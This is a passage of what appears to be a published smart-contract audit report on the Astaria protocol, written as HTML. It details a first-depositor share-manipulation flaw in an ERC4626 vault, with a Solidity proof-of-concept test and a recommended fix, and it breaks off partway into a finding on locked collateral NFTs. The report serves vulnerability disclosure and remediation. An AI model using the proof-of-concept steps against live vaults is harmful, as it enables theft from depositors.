href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/588\">[H-02] ERC4626Cloned deposit and mint logic differ on first deposit</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/588\">adriro</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/630\">JTs</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/614\">yongskiws</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/606\">JC</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/594\">Josiah</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/578\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/557\">eierina</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/542\">eierina</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/509\">Breeje</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/492\">rbserver</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/410\">ast3ros</a>, and <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/278\">obront</a></em></p>\n<p><a href=\"https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L123-L127\">https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L123-L127</a><br>\n<a href=\"https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L129-L133\">https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L129-L133</a></p>\n<p>The <code>ERC4626Cloned</code> contract is an implementation of the ERC4626 used for vaults. The standard contains a <code>deposit</code> function to deposit a specific amount of the underlying asset, and a <code>mint</code> function that will calculate the amount needed of the underlying token to mint a specific number of shares.</p>\n<p>This calculation is done in <code>previewDeposit</code> and <code>previewMint</code>:</p>\n<p><a href=\"https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L123-L127\">https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L123-L127</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">previewDeposit</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">convertToShares</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">convertToShares</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">// Saves an extra SLOAD if totalSupply is non-zero.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">assets</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDivDown</span><span class=\"mtk1\">(</span><span class=\"mtk12\">supply</span><span class=\"mtk1\">, </span><span class=\"mtk11\">totalAssets</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><a href=\"https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L129-L133\">https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L129-L133</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">previewMint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">// Saves an extra SLOAD if totalSupply is non-zero.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> ? </span><span class=\"mtk7\">10e18</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDivUp</span><span class=\"mtk1\">(</span><span class=\"mtk11\">totalAssets</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">supply</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>In the case of the first deposit (i.e. when <code>supply == 0</code>), <code>previewDeposit</code> will return the same <code>assets</code> amount for the shares (this is the standard implementation), while <code>previewMint</code> will simply return <code>10e18</code>.</p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>It seems the intention was to mint a high initial number of shares on first deposit, so an attacker couldn’t mint a low number of shares and manipulate the pool to frontrun an initial depositor.</p>\n<p>However, the protocol has failed to replicate this logic in the <code>deposit</code> function, as both <code>deposit</code> and <code>mint</code> logic differ (see PoC).</p>\n<p>An attacker can still use the <code>deposit</code> function to mint any number of shares.</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MockERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Mock ERC20&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;MERC20&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk7\">18</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TestERC4626</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC4626Cloned</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">MockERC20</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">asset</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assetTokenAddress</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">minDepositAmount</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">totalAssets</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">symbol</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;TEST4626&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">name</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;TestERC4626&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint8</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">AuditTest</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Test</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_ERC4626Cloned_DepositMintDiscrepancy</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">TestERC4626</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vault</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">TestERC4626</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">MockERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">MockERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Amount we deposit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">25e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Shares we get if we deposit amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">previewDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Amount needed to mint shares</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountNeeded</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">previewMint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// The following values should be equal but they not</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertFalse</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">amountNeeded</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// An attacker can still mint a single share by using deposit to manipulate the pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">), </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintedShares</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mintedShares</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommendation-1\" style=\"position:relative;\"><a href=\"#recommendation-1\" aria-label=\"recommendation 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>The <code>deposit</code> function should also implement the same logic as the <code>mint</code> function for the case of the first depositor.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/588\">androolloyd (Astaria) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/588#issuecomment-1436038087\">Picodes (judge) increased severity to High</a></strong></p>\n<hr>\n<h2 id=\"h-03-improper-validations-in-clearinghouse-possible-to-lock-collateral-nft-in-contract\" style=\"position:relative;\"><a href=\"#h-03-improper-validations-in-clearinghouse-possible-to-lock-collateral-nft-in-contract\" aria-label=\"h 03 improper validations in clearinghouse possible to lock collateral nft in contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/521\">[H-03] Improper validations in Clearinghouse, possible to lock collateral NFT in contract</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/521\">Lirios</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/637\">c7e7eff</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/632\">Koolex</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/566\">wallstreetvilkas</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/564\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/539\">0xcm</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/475\">Jeiwan</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/473\">0xsomeone</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/459\">synackrst</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/457\">cergyk</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/361\">evan</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/261\">dragotanqueray</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/210\">HE1M</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/195\">unforgiven</a>, and <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/110\">ladboy233</a></em></p>\n<p>When a borrower does not return the borrowed funds on time, a liquidator can trigger a liquidation.<br>\nIn that case the collateral NFT will be listed in an Seaport dutch auction.<br>\nThe auction requests settlementToken and a fake ClearingHouse NFT.<br>\nWhen a buyer bids enough of the settlementToken, openSea auction will accept the offer, transfer the NFT from ClearingHouse to bidder, move settlementToken from bidder to ClearingHouse, and ‘transfers’ the fake clearinghouse NFT to 